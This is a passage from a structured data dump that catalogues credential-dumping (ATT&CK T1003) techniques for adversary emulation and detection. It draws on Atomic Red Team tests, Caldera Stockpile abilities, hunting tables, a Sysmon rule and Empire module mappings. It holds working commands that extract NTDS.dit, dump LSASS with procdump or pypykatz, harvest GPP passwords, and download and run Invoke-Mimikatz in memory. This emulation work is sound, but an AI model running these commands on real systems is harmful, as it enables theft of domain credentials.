                                                                                                          'requirement\n',
                                                                                    'prereq_command': 'if '
                                                                                                      'not '
                                                                                                      'exist '
                                                                                                      '#{vsc_name} '
                                                                                                      '(exit '
                                                                                                      '/b '
                                                                                                      '1)\n'},
                                                                                   {'description': 'Extract '
                                                                                                   'path '
                                                                                                   'must '
                                                                                                   'exist\n',
                                                                                    'get_prereq_command': 'mkdir '
                                                                                                          '#{extract_path}\n',
                                                                                    'prereq_command': 'if '
                                                                                                      'not '
                                                                                                      'exist '
                                                                                                      '#{extract_path} '
                                                                                                      '(exit '
                                                                                                      '/b '
                                                                                                      '1)\n'}],
                                                                  'description': 'This '
                                                                                 'test '
                                                                                 'is '
                                                                                 'intended '
                                                                                 'to '
                                                                                 'be '
                                                                                 'run '
                                                                                 'on '
                                                                                 'a '
                                                                                 'domain '
                                                                                 'Controller.\n'
                                                                                 '\n'
                                                                                 'The '
                                                                                 'Active '
                                                                                 'Directory '
                                                                                 'database '
                                                                                 'NTDS.dit '
                                                                                 'may '
                                                                                 'be '
                                                                                 'dumped '
                                                                                 'by '
                                                                                 'copying '
                                                                                 'it '
                                                                                 'from '
                                                                                 'a '
                                                                                 'Volume '
                                                                                 'Shadow '
                                                                                 'Copy.\n'
                                                                                 '\n'
                                                                                 'This '
                                                                                 'test '
                                                                                 'requires '
                                                                                 'steps '
                                                                                 'taken '
                                                                                 'in '
                                                                                 'the '
                                                                                 'test '
                                                                                 '"Create '
                                                                                 'Volume '
                                                                                 'Shadow '
                                                                                 'Copy '
                                                                                 'with '
                                                                                 'NTDS.dit".\n'
                                                                                 'A '
                                                                                 'successful '
                                                                                 'test '
                                                                                 'also '
                                                                                 'requires '
                                                                                 'the '
                                                                                 'export '
                                                                                 'of '
                                                                                 'the '
                                                                                 'SYSTEM '
                                                                                 'Registry '
                                                                                 'hive. \n'
                                                                                 'This '
                                                                                 'test '
                                                                                 'must '
                                                                                 'be '
                                                                                 'executed '
                                                                                 'on '
                                                                                 'a '
                                                                                 'Windows '
                                                                                 'Domain '
                                                                                 'Controller.\n',
                                                                  'executor': {'cleanup_command': 'del '
                                                                                                  '"#{extract_path}\\ntds.dit"        '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n'
                                                                                                  'del '
                                                                                                  '"#{extract_path}\\VSC_SYSTEM_HIVE" '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n'
                                                                                                  'del '
                                                                                                  '"#{extract_path}\\SYSTEM_HIVE"     '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n',
                                                                               'command': 'copy '
                                                                                          '#{vsc_name}\\Windows\\NTDS\\NTDS.dit '
                                                                                          '#{extract_path}\\ntds.dit\n'
                                                                                          'copy '
                                                                                          '#{vsc_name}\\Windows\\System32\\config\\SYSTEM '
                                                                                          '#{extract_path}\\VSC_SYSTEM_HIVE\n'
                                                                                          'reg '
                                                                                          'save '
                                                                                          'HKLM\\SYSTEM '
                                                                                          '#{extract_path}\\SYSTEM_HIVE\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'extract_path': {'default': 'C:\\Windows\\Temp',
                                                                                                       'description': 'Path '
                                                                                                                      'for '
                                                                                                                      'extracted '
                                                                                                                      'NTDS.dit',
                                                                                                       'type': 'Path'},
                                                                                      'vsc_name': {'default': '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
                                                                                                   'description': 'Name '
                                                                                                                  'of '
                                                                                                                  'Volume '
                                                                                                                  'Shadow '
                                                                                                                  'Copy',
                                                                                                   'type': 'String'}},
                                                                  'name': 'Copy '
                                                                          'NTDS.dit '
                                                                          'from '
                                                                          'Volume '
                                                                          'Shadow '
                                                                          'Copy',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Computer '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'domain '
                                                                                                   'joined\n',
                                                                                    'get_prereq_command': 'Write-Host '
                                                                                                          'Joining '
                                                                                                          'this '
                                                                                                          'computer '
                                                                                                          'to '
                                                                                                          'a '
                                                                                                          'domain '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'done '
                                                                                                          'manually\n',
                                                                                    'prereq_command': 'if((Get-CIMInstance '
                                                                                                      '-Class '
                                                                                                      'Win32_ComputerSystem).PartOfDomain) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Look '
                                                                                 'for '
                                                                                 'the '
                                                                                 'encrypted '
                                                                                 'cpassword '
                                                                                 'value '
                                                                                 'within '
                                                                                 'Group '
                                                                                 'Policy '
                                                                                 'Preference '
                                                                                 'files '
                                                                                 'on '
                                                                                 'the '
                                                                                 'Domain '
                                                                                 'Controller. '
                                                                                 'This '
                                                                                 'value '
                                                                                 'can '
                                                                                 'be '
                                                                                 'decrypted '
                                                                                 'with '
                                                                                 'gpp-decrypt '
                                                                                 'on '
                                                                                 'Kali '
                                                                                 'Linux.\n',
                                                                  'executor': {'command': 'findstr '
                                                                                          '/S '
                                                                                          'cpassword '
                                                                                          '%logonserver%\\sysvol\\*.xml\n',
                                                                               'elevation_required': False,
                                                                               'name': 'command_prompt'},
                                                                  'name': 'GPP '
                                                                          'Passwords '
                                                                          '(findstr)',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Get-GPPPassword '
                                                                                                   'PowerShell '
                                                                                                   'Script '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'at '
                                                                                                   '#{gpp_script_path}\n',
                                                                                    'get_prereq_command': 'New-Item '
                                                                                                          '-ItemType '
                                                                                                          'Directory '
                                                                                                          '(Split-Path '
                                                                                                          '"#{gpp_script_path}") '
                                                                                                          '-Force '
                                                                                                          '| '
                                                                                                          'Out-Null\n'
                                                                                                          'Invoke-WebRequest '
                                                                                                          '#{gpp_script_url} '
                                                                                                          '-OutFile '
                                                                                                          '"#{gpp_script_path}"\n',
                                                                                    'prereq_command': 'if(Test-Path '
                                                                                                      '"#{gpp_script_path}") '
                                                                                                      '{exit '
                                                                                                      '0 '
                                                                                                      '} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1 '
                                                                                                      '}\n'},
                                                                                   {'description': 'Computer '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'domain '
                                                                                                   'joined\n',
                                                                                    'get_prereq_command': 'Write-Host '
                                                                                                          'Joining '
                                                                                                          'this '
                                                                                                          'computer '
                                                                                                          'to '
                                                                                                          'a '
                                                                                                          'domain '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'done '
                                                                                                          'manually\n',
                                                                                    'prereq_command': 'if((Get-CIMInstance '
                                                                                                      '-Class '
                                                                                                      'Win32_ComputerSystem).PartOfDomain) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Look '
                                                                                 'for '
                                                                                 'the '
                                                                                 'encrypted '
                                                                                 'cpassword '
                                                                                 'value '
                                                                                 'within '
                                                                                 'Group '
                                                                                 'Policy '
                                                                                 'Preference '
                                                                                 'files '
                                                                                 'on '
                                                                                 'the '
                                                                                 'Domain '
                                                                                 'Controller.\n'
                                                                                 'This '
                                                                                 'test '
                                                                                 'is '
                                                                                 'intended '
                                                                                 'to '
                                                                                 'be '
                                                                                 'run '
                                                                                 'from '
                                                                                 'a '
                                                                                 'domain '
                                                                                 'joined '
                                                                                 'workstation, '
                                                                                 'not '
                                                                                 'on '
                                                                                 'the '
                                                                                 'Domain '
                                                                                 'Controller '
                                                                                 'itself.\n'
                                                                                 'The '
                                                                                 'Get-GPPPasswords.ps1 '
                                                                                 'executed '
                                                                                 'during '
                                                                                 'this '
                                                                                 'test '
                                                                                 'can '
                                                                                 'be '
                                                                                 'obtained '
                                                                                 'using '
                                                                                 'the '
                                                                                 'get-prereq_commands.\n'
                                                                                 '\n'
                                                                                 'Successful '
                                                                                 'test '
                                                                                 'execution '
                                                                                 'will '
                                                                                 'either '
                                                                                 'display '
                                                                                 'the '
                                                                                 'credentials '
                                                                                 'found '
                                                                                 'in '
                                                                                 'the '
                                                                                 'GPP '
                                                                                 'files '
                                                                                 'or '
                                                                                 'indicate '
                                                                                 '"No '
                                                                                 'preference '
                                                                                 'files '
                                                                                 'found".\n',
                                                                  'executor': {'command': '. '
                                                                                          '#{gpp_script_path}\n'
                                                                                          'Get-GPPPassword '
                                                                                          '-Verbose\n',
                                                                               'elevation_required': False,
                                                                               'name': 'powershell'},
                                                                  'input_arguments': {'gpp_script_path': {'default': 'PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1',
                                                                                                          'description': 'Path '
                                                                                                                         'to '
                                                                                                                         'the '
                                                                                                                         'Get-GPPPassword '
                                                                                                                         'PowerShell '
                                                                                                                         'Script',
                                                                                                          'type': 'Path'},
                                                                                      'gpp_script_url': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1',
                                                                                                         'description': 'URL '
                                                                                                                        'of '
                                                                                                                        'the '
                                                                                                                        'Get-GPPPassword '
                                                                                                                        'PowerShell '
                                                                                                                        'Script',
                                                                                                         'type': 'url'}},
                                                                  'name': 'GPP '
                                                                          'Passwords '
                                                                          '(Get-GPPPassword)',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Computer '
                                                                                                   'must '
                                                                                                   'have '
                                                                                                   'python '
                                                                                                   '3 '
                                                                                                   'installed\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          '"Python '
                                                                                                          '3 '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'installed '
                                                                                                          'manually"\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(python '
                                                                                                      '--version) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'},
                                                                                   {'description': 'Computer '
                                                                                                   'must '
                                                                                                   'have '
                                                                                                   'pip '
                                                                                                   'installed\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          '"PIP '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'installed '
                                                                                                          'manually"\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(pip3 '
                                                                                                      '-V) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'},
                                                                                   {'description': 'pypykatz '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'installed '
                                                                                                   'and '
                                                                                                   'part '
                                                                                                   'of '
                                                                                                   'PATH\n',
                                                                                    'get_prereq_command': 'pip3 '
                                                                                                          'install '
                                                                                                          'pypykatz\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(cmd '
                                                                                                      '/c '
                                                                                                      'pypykatz '
                                                                                                      '-h) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Parses '
                                                                                 'secrets '
                                                                                 'hidden '
                                                                                 'in '
                                                                                 'the '
                                                                                 'LSASS '
                                                                                 'process '
                                                                                 'with '
                                                                                 'python. '
                                                                                 'Similar '
                                                                                 'to '
                                                                                 "mimikatz's "
                                                                                 'sekurlsa::\n'
                                                                                 '\n'
                                                                                 'Python '
                                                                                 '3 '
                                                                                 'must '
                                                                                 'be '
                                                                                 'installed, '
                                                                                 'use '
                                                                                 'the '
                                                                                 "get_prereq_command's "
                                                                                 'to '
                                                                                 'meet '
                                                                                 'the '
                                                                                 'prerequisites '
                                                                                 'for '
                                                                                 'this '
                                                                                 'test.\n'
                                                                                 '\n'
                                                                                 'Successful '
                                                                                 'execution '
                                                                                 'of '
                                                                                 'this '
                                                                                 'test '
                                                                                 'will '
                                                                                 'display '
                                                                                 'multiple '
                                                                                 'useranames '
                                                                                 'and '
                                                                                 'passwords/hashes '
                                                                                 'to '
                                                                                 'the '
                                                                                 'screen.\n'
                                                                                 '  \n',
                                                                  'executor': {'command': 'pypykatz '
                                                                                          'live '
                                                                                          'lsa\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'name': 'LSASS '
                                                                          'read '
                                                                          'with '
                                                                          'pypykatz',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Computer '
                                                                                                   'must '
                                                                                                   'have '
                                                                                                   'python '
                                                                                                   '3 '
                                                                                                   'installed\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          '"Python '
                                                                                                          '3 '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'installed '
                                                                                                          'manually"\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(python '
                                                                                                      '--version) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'},
                                                                                   {'description': 'Computer '
                                                                                                   'must '
                                                                                                   'have '
                                                                                                   'pip '
                                                                                                   'installed\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          '"PIP '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'installed '
                                                                                                          'manually"\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(pip3 '
                                                                                                      '-V) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'},
                                                                                   {'description': 'pypykatz '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'installed '
                                                                                                   'and '
                                                                                                   'part '
                                                                                                   'of '
                                                                                                   'PATH\n',
                                                                                    'get_prereq_command': 'pip3 '
                                                                                                          'install '
                                                                                                          'pypykatz\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(cmd '
                                                                                                      '/c '
                                                                                                      'pypykatz '
                                                                                                      '-h) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Parses '
                                                                                 'registry '
                                                                                 'hives '
                                                                                 'to '
                                                                                 'obtain '
                                                                                 'stored '
                                                                                 'credentials\n',
                                                                  'executor': {'command': 'pypykatz '
                                                                                          'live '
                                                                                          'registry\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'name': 'Registry '
                                                                          'parse '
                                                                          'with '
                                                                          'pypykatz',
                                                                  'supported_platforms': ['windows']}],
                                                'attack_technique': 'T1003',
                                                'display_name': 'Credential '
                                                                'Dumping'}},
 {'Mitre Stockpile - Get a list of all computers in a domain': {'description': 'Get '
                                                                               'a '
                                                                               'list '
                                                                               'of '
                                                                               'all '
                                                                               'computers '
                                                                               'in '
                                                                               'a '
                                                                               'domain',
                                                                'id': '0360ede1-3c28-48d3-a6ef-6e98f562c5af',
                                                                'name': 'GetComputers '
                                                                        '(Alice)',
                                                                'platforms': {'windows': {'psh': {'command': 'Import-Module '
                                                                                                             '.\\PowerView.ps1 '
                                                                                                             '-Force;\n'
                                                                                                             'Get-NetComputer\n',
                                                                                                  'payloads': ['powerview.ps1']}}},
                                                                'tactic': 'credential-access',
                                                                'technique': {'attack_id': 'T1003',
                                                                              'name': 'Credential '
                                                                                      'Dumping'}}},
 {'Mitre Stockpile - Dump lsass for later use with mimikatz': {'description': 'Dump '
                                                                              'lsass '
                                                                              'for '
                                                                              'later '
                                                                              'use '
                                                                              'with '
                                                                              'mimikatz',
                                                               'id': '0ef4cc7b-611c-4237-b20b-db36b6906554',
                                                               'name': 'Leverage '
                                                                       'Procdump '
                                                                       'for '
                                                                       'lsass '
                                                                       'memory',
                                                               'platforms': {'windows': {'psh': {'command': '$ps_url '
                                                                                                            '= '
                                                                                                            '"https://download.sysinternals.com/files/Procdump.zip";\n'
                                                                                                            '$download_folder '
                                                                                                            '= '
                                                                                                            '"C:\\Users\\Public\\";\n'
                                                                                                            '$staging_folder '
                                                                                                            '= '
                                                                                                            '"C:\\Users\\Public\\temp";\n'
                                                                                                            'Start-BitsTransfer '
                                                                                                            '-Source '
                                                                                                            '$ps_url '
                                                                                                            '-Destination '
                                                                                                            '$download_folder;\n'
                                                                                                            'Expand-Archive '
                                                                                                            '-LiteralPath '
                                                                                                            '$download_folder"Procdump.zip" '
                                                                                                            '-DestinationPath '
                                                                                                            '$staging_folder;\n'
                                                                                                            '$arch=[System.Environment]::Is64BitOperatingSystem;\n'
                                                                                                            '\n'
                                                                                                            'if '
                                                                                                            '($arch) '
                                                                                                            '{\n'
                                                                                                            '    '
                                                                                                            'iex '
                                                                                                            '$staging_folder"\\procdump64.exe '
                                                                                                            '-accepteula '
                                                                                                            '-ma '
                                                                                                            'lsass.exe" '
                                                                                                            '> '
                                                                                                            '$env:APPDATA\\error.dmp '
                                                                                                            '2>&1;\n'
                                                                                                            '} '
                                                                                                            'else '
                                                                                                            '{\n'
                                                                                                            '    '
                                                                                                            'iex '
                                                                                                            '$staging_folder"\\procdump.exe '
                                                                                                            '-accepteula '
                                                                                                            '-ma '
                                                                                                            'lsass.exe" '
                                                                                                            '> '
                                                                                                            '$env:APPDATA\\error.dmp '
                                                                                                            '2>&1;\n'
                                                                                                            '}\n'
                                                                                                            'remove-item '
                                                                                                            '$staging_folder '
                                                                                                            '-Recurse;\n'}}},
                                                               'tactic': 'credential-access',
                                                               'technique': {'attack_id': 'T1003',
                                                                             'name': 'Credential '
                                                                                     'Dumping'}}},
 {'Mitre Stockpile - Custom GO credential dumper using minidumpwritedump': {'description': 'Custom '
                                                                                           'GO '
                                                                                           'credential '
                                                                                           'dumper '
                                                                                           'using '
                                                                                           'minidumpwritedump',
                                                                            'id': '3c647015-ab0a-496a-8847-6ab173cd2b22',
                                                                            'name': 'MiniDumpWriteDump '
                                                                                    '(Spooky)',
                                                                            'platforms': {'windows': {'psh': {'command': '.\\totallylegit.exe '
                                                                                                                         '#{host.process.id} '
                                                                                                                         'C:\\Users\\Public\\creds.dmp\n',
                                                                                                              'payloads': ['totallylegit.exe']}}},
                                                                            'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.process.id'}]}],
                                                                            'tactic': 'credential-access',
                                                                            'technique': {'attack_id': 'T1003',
                                                                                          'name': 'Credential '
                                                                                                  'Dumping'}}},
 {'Mitre Stockpile - Use Invoke-Mimikatz': {'description': 'Use '
                                                           'Invoke-Mimikatz',
                                            'id': '7049e3ec-b822-4fdf-a4ac-18190f9b66d1',
                                            'name': 'Powerkatz (Staged)',
                                            'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item '
                                                                                         '-Force '
                                                                                         '-Path '
                                                                                         '"invoke-mimi.ps1"',
                                                                              'command': 'Import-Module '
                                                                                         '.\\invoke-mimi.ps1;\n'
                                                                                         'Invoke-Mimikatz '
                                                                                         '-DumpCreds\n',
                                                                              'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
                                                                                                                                  'source': 'domain.user.name',
                                                                                                                                  'target': 'domain.user.password'},
                                                                                                                                 {'edge': 'has_hash',
                                                                                                                                  'source': 'domain.user.name',
                                                                                                                                  'target': 'domain.user.ntlm'},
                                                                                                                                 {'edge': 'has_hash',
                                                                                                                                  'source': 'domain.user.name',
                                                                                                                                  'target': 'domain.user.sha1'}]},
                                                                              'payloads': ['invoke-mimi.ps1.xored']}}},
                                            'privilege': 'Elevated',
                                            'tactic': 'credential-access',
                                            'technique': {'attack_id': 'T1003',
                                                          'name': 'Credential '
                                                                  'Dumping'}}},
 {'Mitre Stockpile - Search for possible credentials stored in the HKLM Hive': {'description': 'Search '
                                                                                               'for '
                                                                                               'possible '
                                                                                               'credentials '
                                                                                               'stored '
                                                                                               'in '
                                                                                               'the '
                                                                                               'HKLM '
                                                                                               'Hive',
                                                                                'id': '98e58fc4-3843-4511-89b1-50cb872e0c9b',
                                                                                'name': 'Credentials '
                                                                                        'in '
                                                                                        'Registry',
                                                                                'platforms': {'windows': {'psh': {'command': 'reg '
                                                                                                                             'query '
                                                                                                                             'HKLM '
                                                                                                                             '/f '
                                                                                                                             'password '
                                                                                                                             '/t '
                                                                                                                             'REG_SZ '
                                                                                                                             '/s\n'}}},
                                                                                'tactic': 'credential-access',
                                                                                'technique': {'attack_id': 'T1003',
                                                                                              'name': 'Credential '
                                                                                                      'Dumping'}}},
 {'Mitre Stockpile - Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords': {'description': 'Use '
                                                                                                                               'powerkatz '
                                                                                                                               'to '
                                                                                                                               'execute '
                                                                                                                               'mimikatz '
                                                                                                                               'and '
                                                                                                                               'attempt '
                                                                                                                               'to '
                                                                                                                               'grab '
                                                                                                                               'plaintext '
                                                                                                                               'and/or '
                                                                                                                               'hashed '
                                                                                                                               'passwords',
                                                                                                                'id': 'baac2c6d-4652-4b7e-ab0a-f1bf246edd12',
                                                                                                                'name': 'Run '
                                                                                                                        'PowerKatz',
                                                                                                                'platforms': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                                                                                                                                             '= '
                                                                                                                                                             '{ '
                                                                                                                                                             '$True '
                                                                                                                                                             '};\n'
                                                                                                                                                             '$web '
                                                                                                                                                             '= '
                                                                                                                                                             '(New-Object '
                                                                                                                                                             'System.Net.WebClient);\n'
                                                                                                                                                             '$result '
                                                                                                                                                             '= '
                                                                                                                                                             '$web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\n'
                                                                                                                                                             'iex '
                                                                                                                                                             '$result; '
                                                                                                                                                             'Invoke-Mimikatz '
                                                                                                                                                             '-DumpCreds\n',
                                                                                                                                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
                                                                                                                                                                                                      'source': 'domain.user.name',
                                                                                                                                                                                                      'target': 'domain.user.password'}]}}}},
                                                                                                                'tactic': 'credential-access',
                                                                                                                'technique': {'attack_id': 'T1003',
                                                                                                                              'name': 'Credential '
                                                                                                                                      'Dumping'}}},
 {'Threat Hunting Tables': {'chain_id': '100053',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': 'ntds.dit',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1003',
                            'mitre_caption': 'credential dumping',
                            'os': 'windows',
                            'parent_process': 'ntdsutil.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1003': {'description': None,
                           'level': 'critical',
                           'name': 'Credential Dumping',
                           'phase': 'Credential Access',
                           'query': [{'op': 'and',
                                      'process': {'image': {'flag': 'regex',
                                                            'op': 'not',
                                                            'pattern': '\\\\Windows\\\\.+\\\\lsass.exe'}},
                                      'reg': {'path': {'pattern': 'HKLM\\SAM|HKLM\\Security'}},
                                      'type': 'reg'},
                                     {'file': {'path': {'flag': 'regex',
                                                        'pattern': '\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll'}},
                                      'type': 'file'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/ChromeDump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/ChromeDump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/FoxDump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/FoxDump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/ninjacopy":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/ninjacopy',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/add_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/add_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/find_keepass_config":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/find_keepass_config',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/get_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/get_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/keethief":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/keethief',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/remove_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/remove_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/enum_cred_store":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/enum_cred_store',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/cache":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/cache',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/command":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/command',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/dcsync":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/dcsync',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/dcsync_hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/dcsync_hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/extract_tickets":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/extract_tickets',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': 'T1097',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/golden_ticket":  '
                                                                                 '["T1003","T1097"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/golden_ticket',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/logonpasswords":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/logonpasswords',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/lsadump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/lsadump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/mimitokens":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/mimitokens',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
